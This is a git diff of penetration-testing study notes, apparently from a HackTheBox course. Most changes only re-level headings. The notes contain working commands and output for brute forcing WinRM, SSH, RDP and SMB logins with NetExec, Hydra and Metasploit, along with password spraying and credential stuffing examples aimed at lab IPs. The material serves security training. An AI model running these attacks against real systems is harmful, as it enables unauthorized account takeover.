@@ -1,33 +1,33 @@
 - [Remote Password Attacks](#remote-password-attacks)
   - [WinRM](#winrm)
-  - [NetExec](#netexec)
-    - [Installing](#installing)
-    - [Menu Options](#menu-options)
-    - [Protocol-Specific Help](#protocol-specific-help)
-    - [Usage](#usage)
-    - [Example](#example)
-  - [Evil-WinRM](#evil-winrm)
-    - [Installing](#installing-1)
-    - [Usage](#usage-1)
-    - [Example](#example-1)
+    - [NetExec](#netexec)
+      - [Installing](#installing)
+      - [Menu Options](#menu-options)
+      - [Protocol-Specific Help](#protocol-specific-help)
+      - [Usage](#usage)
+      - [Example](#example)
+    - [Evil-WinRM](#evil-winrm)
+      - [Installing](#installing-1)
+      - [Usage](#usage-1)
+      - [Example](#example-1)
   - [SSH](#ssh)
-  - [Hydra](#hydra)
+    - [Hydra](#hydra)
   - [RDP](#rdp)
-  - [Hydra](#hydra-1)
-  - [xFreeRDP](#xfreerdp)
-    - [Usage](#usage-2)
-    - [Example](#example-2)
+    - [Hydra](#hydra-1)
+    - [xFreeRDP](#xfreerdp)
+      - [Usage](#usage-2)
+      - [Example](#example-2)
   - [SMB](#smb)
-  - [Hydra](#hydra-2)
-    - [Example](#example-3)
-    - [Error](#error)
-  - [Metasploit](#metasploit)
-  - [NetExec](#netexec-1)
-  - [SMB](#smb-1)
+    - [Hydra](#hydra-2)
+      - [Example](#example-3)
+      - [Error](#error)
+    - [Metasploit](#metasploit)
+    - [NetExec](#netexec-1)
+    - [smblcient](#smblcient)
   - [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
-  - [Password Spraying](#password-spraying)
-  - [Credential Stuffing](#credential-stuffing)
-  - [Default Credentials](#default-credentials)
+    - [Password Spraying](#password-spraying)
+    - [Credential Stuffing](#credential-stuffing)
+    - [Default Credentials](#default-credentials)
 
 ---
 
@@ -43,15 +43,15 @@ By default, WinRM uses the TCP ports 5985 and 5986.
 
 A handy tool you can use for your password attacks is NetExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.
 
-## NetExec
+### NetExec
 
-### Installing
+#### Installing
 
 ```bash
 d41y@htb[/htb]$ sudo apt-get -y install netexec
 ```
 
-### Menu Options
+#### Menu Options
 
 ```bash
 d41y@htb[/htb]$ netexec -h
@@ -121,7 +121,7 @@ Available Protocols:
     vnc                 own stuff using VNC
 ```
 
-### Protocol-Specific Help
+#### Protocol-Specific Help
 
 ```bash
 d41y@htb[/htb]$ netexec smb -h
@@ -147,13 +147,13 @@ positional arguments:
 <SNIP>
 ```
 
-### Usage
+#### Usage
 
 ```bash
 d41y@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
 ```
 
-### Example
+#### Example
 
 ```bash
 d41y@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
@@ -165,11 +165,11 @@ WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3
 
 The appearance of ```(Pwn3d!)``` is the sign that you can most likely execute system commands if you log in with the brute-forced user.
 
-## Evil-WinRM
+### Evil-WinRM
 
 Another handy tool that you can use to communicate with the WinRM service is Evil-WinRM, which allows you to communicate with the WinRM service efficiently.
 
-### Installing
+#### Installing
 
 ```bash
 d41y@htb[/htb]$ sudo gem install evil-winrm
@@ -188,13 +188,13 @@ Fetching winrm-fs-1.3.5.gem
 Happy hacking! :)
 ```
 
-### Usage
+#### Usage
 
 ```bash
 d41y@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
 ```
 
-### Example
+#### Example
 
 ```bash
 d41y@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
@@ -210,7 +210,7 @@ Info: Establishing connection to remote endpoint
 
 ... is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by defauolt, to which you can connect using an SSH client.
 
-## Hydra
+### Hydra
 
 You can use a tool like Hydra to brute force SSH.
 
@@ -253,7 +253,7 @@ user@WINSRV C:\Users\user>
 
 ... is a network protocol that allows remote access to Windows systems via TCP port 3389, by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but is also used in some third-party solutions.
 
-## Hydra
+### Hydra
 
 ```bash
 d41y@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
@@ -272,17 +272,17 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-## xFreeRDP
+### xFreeRDP
 
 Linux offers different clients to communicate with the desired server using the RDP protocol. These include Remmina, xfreerdp, and many others.
 
-### Usage
+#### Usage
 
 ```bash
 xfreerdp /v:<target-IP> /u:<username> /p:<password>
 ```
 
-### Example
+#### Example
 
 ```bash
 d41y@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
@@ -306,9 +306,9 @@ Do you trust the above certificate? (Y/T/N) Y
 
 It is also known as Common Internet File System (_CIFS_). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux or macOS. In addition, you will often encounter Samba, which is an open-source implementation of the above functions. For SMB, you can also use Hydra again to try different usernames in combination with different passwords.
 
-## Hydra
+### Hydra
 
-### Example
+#### Example
 
 ```bash
 d41y@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
@@ -323,7 +323,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:
 1 of 1 target successfully completed, 1 valid passwords found
 ```
 
-### Error
+#### Error
 
 However, you may also get the following error describing that the server has sent an invalid reply.
 
@@ -341,7 +341,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:
 
 This is because you most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, you can manually update and recompile Hydra or use another tool, like Metasploit.
 
-## Metasploit
+### Metasploit
 
 ```bash
 d41y@htb[/htb]$ msfconsole -q
@@ -400,7 +400,7 @@ msf6 auxiliary(scanner/smb/smb_login) > run
 [*] Auxiliary module execution completed
 ```
 
-## NetExec
+### NetExec
 
 Now you can use NetExec again to view the available shares and what privileges you have for them.
 
@@ -418,7 +418,7 @@ SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE
 SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
 ```
 
-## SMB
+### smblcient
 
 To communicate with the server via SMB, you can use, for example, the tool smbclient. This tool will allow you to view the contents of the shares, upload, or download files if your privileges allow it.
 
@@ -441,7 +441,7 @@ smb: \>
 
 ## Spraying, Stuffing, and Defaults
 
-## Password Spraying
+### Password Spraying
 
 ... is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use ```ChangeMe123!``` when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.
 
@@ -451,7 +451,7 @@ Depending on the target system, different tools may be used to carry out passwor
 d41y@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
 ```
 
-## Credential Stuffing
+### Credential Stuffing
 
 ... is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms, these attacks are sometimes successful. As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system. For example, if you have a list of ```username:password``` credentials obtained from a database leak, you can use Hydra to perform a credential stuffing attack against an SSH service using the following syntax:
 
@@ -459,7 +459,7 @@ d41y@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
 d41y@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
 ```
 
-## Default Credentials
+### Default Credentials
 
 Many systems - such as routers, firewalls, and databases - come with defautl credentials. While best practice dictates that admins change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.
 
